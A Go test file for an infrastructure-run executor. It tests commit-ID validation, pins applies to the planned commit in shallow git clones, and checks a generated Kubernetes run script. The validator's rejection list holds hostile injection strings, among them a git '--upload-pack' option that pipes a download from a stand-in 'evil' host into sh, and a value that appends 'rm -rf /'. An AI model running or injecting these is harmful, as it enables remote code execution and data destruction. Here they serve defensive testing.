package executor

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestIsCommitSHA(t *testing.T) {
	ok := []string{
		"9f1c0d3a5b7e2f4681c9a0d3e5f7b921c4d6e8fa", // sha-1
		"9F1C0D3A5B7E2F4681C9A0D3E5F7B921C4D6E8FA",
		"9f1c0d3",               // abbreviated
		strings.Repeat("a", 64), // sha-256
	}
	for _, s := range ok {
		if !IsCommitSHA(s) {
			t.Errorf("IsCommitSHA(%q) = false, want true", s)
		}
	}

	// Anything that is not an object id is refused, including the shapes that
	// would be read as a git option or a shell payload if they reached git.
	bad := []string{
		"",
		"main",
		"9f1c0d", // too short to be an abbreviation git would accept
		strings.Repeat("a", 65),
		"--upload-pack=curl evil|sh",
		"-c core.sshCommand=x",
		"9f1c0d3a5b7e2f46; rm -rf /",
		"HEAD",
		"refs/heads/main",
		"9f1c0d3a5b7e2f4681c9a0d3e5f7b921c4d6e8fz",
	}
	for _, s := range bad {
		if IsCommitSHA(s) {
			t.Errorf("IsCommitSHA(%q) = true, want false", s)
		}
	}
}

// git is on the path in CI and on a dev machine; skip rather than fail if it
// isn't, so the rest of the package still runs.
func requireGit(t *testing.T) {
	t.Helper()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
}

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", append([]string{"-C", dir}, args...)...)
	cmd.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=portal", "GIT_AUTHOR_EMAIL=portal@test.local",
		"GIT_COMMITTER_NAME=portal", "GIT_COMMITTER_EMAIL=portal@test.local",
		"GIT_CONFIG_GLOBAL=/dev/null", "GIT_CONFIG_SYSTEM=/dev/null",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return strings.TrimSpace(string(out))
}

// seedRepo builds an origin repo with two commits on one branch and returns its
// path plus both commit ids — a branch that has moved, which is the situation
// the pin exists for.
func seedRepo(t *testing.T) (path, first, second string) {
	t.Helper()
	path = t.TempDir()
	git(t, path, "init", "--initial-branch=main")
	// Allow a shallow clone to fetch an arbitrary object by id, the way a
	// hosted remote does.
	git(t, path, "config", "uploadpack.allowAnySHA1InWant", "true")

	if err := os.WriteFile(filepath.Join(path, "main.tf"), []byte("# planned\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, path, "add", "main.tf")
	git(t, path, "commit", "-m", "the tree the plan was produced from")
	first = git(t, path, "rev-parse", "HEAD")

	if err := os.WriteFile(filepath.Join(path, "main.tf"), []byte("# pushed after the plan\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, path, "add", "main.tf")
	git(t, path, "commit", "-m", "pushed while the plan waited for a signature")
	second = git(t, path, "rev-parse", "HEAD")

	return path, first, second
}

func shallowClone(t *testing.T, origin string) string {
	t.Helper()
	dst := filepath.Join(t.TempDir(), "work")
	cmd := exec.Command("git", "clone", "--depth", "1", "--branch=main", "--", origin, dst)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("clone: %v\n%s", err, out)
	}
	return dst
}

// The exploit: a plan on a gated workspace parks at awaiting_approval, someone
// pushes to the branch, the admin signs the diff they were shown, and the apply
// clones branch head — a tree nobody planned. checkoutCommit is what puts the
// apply back on the commit the plan ran, out of a shallow clone that does not
// contain it yet.
func TestCheckoutCommitMovesAShallowCloneOntoThePinnedCommit(t *testing.T) {
	requireGit(t)
	origin, planned, pushed := seedRepo(t)

	work := shallowClone(t, origin)
	if head := git(t, work, "rev-parse", "HEAD"); head != pushed {
		t.Fatalf("clone HEAD = %s, want the branch head %s", head, pushed)
	}

	if err := checkoutCommit(context.Background(), work, planned, func([]byte) {}); err != nil {
		t.Fatalf("checkoutCommit: %v", err)
	}

	head, err := resolveHead(context.Background(), work)
	if err != nil {
		t.Fatalf("resolveHead: %v", err)
	}
	if head != planned {
		t.Fatalf("HEAD = %s, want the planned commit %s", head, planned)
	}
	body, err := os.ReadFile(filepath.Join(work, "main.tf"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.TrimSpace(string(body)) != "# planned" {
		t.Errorf("working tree = %q, want the planned tree", strings.TrimSpace(string(body)))
	}
}

// The legitimate case: no pin, so the run executes branch head and reports which
// commit that was, which is what the worker records to pin the run.
func TestResolveHeadReportsBranchHead(t *testing.T) {
	requireGit(t)
	origin, _, pushed := seedRepo(t)
	work := shallowClone(t, origin)

	head, err := resolveHead(context.Background(), work)
	if err != nil {
		t.Fatalf("resolveHead: %v", err)
	}
	if head != pushed {
		t.Errorf("resolveHead = %s, want %s", head, pushed)
	}
}

// A commit the branch no longer reaches — force-pushed over, or a different repo
// entirely — fails the run. Falling back to branch head would apply the tree the
// pin exists to refuse.
func TestCheckoutCommitFailsWhenTheCommitIsGone(t *testing.T) {
	requireGit(t)
	origin, _, _ := seedRepo(t)
	work := shallowClone(t, origin)

	missing := "0123456789abcdef0123456789abcdef01234567"
	if err := checkoutCommit(context.Background(), work, missing, func([]byte) {}); err == nil {
		t.Fatal("checkoutCommit succeeded for a commit that is not in the repo")
	}

	// And a pin that is not an object id never reaches git at all.
	if err := checkoutCommit(context.Background(), work, "--upload-pack=evil", func([]byte) {}); err == nil {
		t.Fatal("checkoutCommit accepted a git option as a commit id")
	}
}

// The Kubernetes executor cannot call git directly — it emits a shell script and
// reads the pod log back. Both halves of the pin have to survive that: the
// script has to check the commit out, and the commit it ran has to come back out
// of the log without leaking the marker into what the user reads.
func TestKubernetesScriptChecksOutThePinAndReportsTheCommit(t *testing.T) {
	e := &KubernetesExecutor{}
	script := e.buildScript(ExecuteParams{Operation: "plan", Source: "vcs"})

	for _, want := range []string{
		`if [ -n "$PORTAL_COMMIT_SHA" ]; then`,
		`git -C /work fetch --depth 1 origin "$PORTAL_COMMIT_SHA"`,
		`git -C /work checkout --detach "$PORTAL_COMMIT_SHA"`,
		commitMarker,
	} {
		if !strings.Contains(script, want) {
			t.Errorf("run script is missing %q", want)
		}
	}
	// The value is only ever a shell variable, never inlined — a script that
	// interpolated it would execute whatever the pin contained.
	if !strings.Contains(script, "$(git -C /work rev-parse HEAD)\"\n") {
		t.Error("run script does not report the executed commit")
	}
}

func TestKubernetesOutputParsingLiftsTheCommitOutOfTheLog(t *testing.T) {
	const sha = "9f1c0d3a5b7e2f4681c9a0d3e5f7b921c4d6e8fa"
	output := "Cloning https://example.test/infra.git (branch: main)...\n" +
		commitMarker + sha + "\n" +
		"$ tofu init\nInitializing...\n"

	m := commitMarkerRe.FindStringSubmatch(output)
	if m == nil {
		t.Fatal("commit marker was not found in the log")
	}
	if m[1] != sha {
		t.Errorf("parsed commit = %q, want %q", m[1], sha)
	}

	cleaned := commitMarkerRe.ReplaceAllString(output, "")
	if strings.Contains(cleaned, commitMarker) {
		t.Error("the marker line is still in the output the user reads")
	}
	if !strings.Contains(cleaned, "$ tofu init") {
		t.Error("stripping the marker line dropped the rest of the log")
	}
}

// An upload-source run has no clone, so the script must not try to check
// anything out or report a commit.
func TestKubernetesScriptSkipsTheCheckoutForUploads(t *testing.T) {
	e := &KubernetesExecutor{}
	script := e.buildScript(ExecuteParams{Operation: "plan", Source: "upload"})

	if strings.Contains(script, "PORTAL_COMMIT_SHA") {
		t.Error("upload run script tries to check out a commit")
	}
	if strings.Contains(script, commitMarker) {
		t.Error("upload run script reports a commit it never resolved")
	}
}
